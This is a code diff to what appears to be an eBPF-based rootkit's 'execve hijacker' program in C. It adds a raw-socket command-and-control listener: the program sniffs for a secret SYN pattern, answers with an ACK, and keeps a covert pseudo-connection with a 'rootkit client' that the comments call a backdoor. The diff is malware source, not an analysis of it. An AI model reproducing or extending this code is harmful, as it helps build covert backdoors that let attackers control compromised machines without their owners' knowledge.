@@ -8,8 +8,39 @@
 #include <sys/wait.h>
 #include <bpf/bpf.h>
 #include <bpf/libbpf.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
 
 #include "lib/RawTCP.h"
+#include "../common/c&c.h"
+
+char* getLocalIpAddress(){
+    char hostbuffer[256];
+    char* IPbuffer = calloc(256, sizeof(char));
+    struct hostent *host_entry;
+    int hostname;
+  
+    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
+    if(hostname==-1){
+        exit(1);
+    }
+  
+    host_entry = gethostbyname(hostbuffer);
+    if(host_entry == NULL){
+        exit(1);
+    }
+  
+    // To convert an Internet network
+    // address into ASCII string
+    strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
+  
+    return IPbuffer;
+}
 
 int main(int argc, char* argv[]){
     printf("Hello world from execve hijacker\n");
@@ -47,6 +78,43 @@ int main(int argc, char* argv[]){
     write(fd, "\n", 1);
 
     close(fd);
+
+
+    packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
+
+    //TODO GET THE IP FROM THE BACKDOOR CLIENT
+    char* local_ip = getLocalIpAddress();
+    char remote_ip[16];
+    inet_ntop(AF_INET, &(packet.ipheader->saddr), remote_ip, 16);
+    printf("IP: %s\n", local_ip);
+    
+    packet_t packet_ack = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, CC_PROT_ACK);
+    if(rawsocket_send(packet_ack)<0){
+        return -1;
+    }
+
+    //Start of pseudo connection with the rootkit client
+    int connection_close = 0;
+    while(!connection_close){
+        packet_t packet = rawsocket_sniff_pattern(CC_PROT_MSG);
+        printf("Received client message\n");
+        char* payload = packet.payload;
+        char *p;
+        p = strtok(payload, "#");
+        p = strtok(NULL, "#");
+        if(p){
+            if(strcmp(p, CC_PROT_FIN_PART)==0){
+                printf("Connection closed by request\n");
+                connection_close = 1;
+            }else{
+                printf("Received request: %s\n", p);
+                packet_t packet_res = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, CC_PROT_MSG);
+                if(rawsocket_send(packet_res)<0){
+                    return -1;
+                }
+            }
+        }
+    }
 
     return 0;
 }
